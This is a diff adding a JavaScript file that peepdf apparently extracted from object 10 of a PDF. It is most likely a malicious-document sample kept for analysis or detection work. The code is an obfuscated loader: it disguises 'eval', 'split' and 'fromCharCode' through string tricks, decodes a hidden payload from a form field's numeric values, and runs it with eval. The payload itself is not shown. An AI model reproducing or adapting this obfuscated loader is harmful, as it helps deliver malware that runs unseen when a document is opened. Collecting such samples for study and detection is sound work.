@@ -1,0 +1,36 @@
+// peepdf comment: Javascript code located in object 10 (version 0)
+
+bpf = new Date(2010, 11, 4, 2);
+var eoru = '';
+var oxz = function() {
+        return {
+            e: eval
+        }
+    }().e;
+
+function jna() {
+    var mwdq = '',
+        mnq = [];
+    var eoru = '';
+    var xmbv = function() {
+            return {
+                e: 'split'
+            }
+        }().e;;
+    var butw = '2010';
+    butw = '';
+    var du = khfdskjfh.rawValue[xmbv](',');
+    jhs = 'le' + eoru + 'ng' + eoru + 'th';
+    var oep = du[jhs] / 2;
+    var va = 'fro' + bpf.getHours() + 'arCode';
+    va = va.replace(2, 'mCh');
+    pfq = String[va];
+    for (var sq = 0; sq < oep; sq++) {
+        yw = du[sq + oep] - du[sq];
+        mwdq += pfq(yw);;
+    }
+    return mwdq;
+}
+var yw = jna();
+oxz(yw);
+
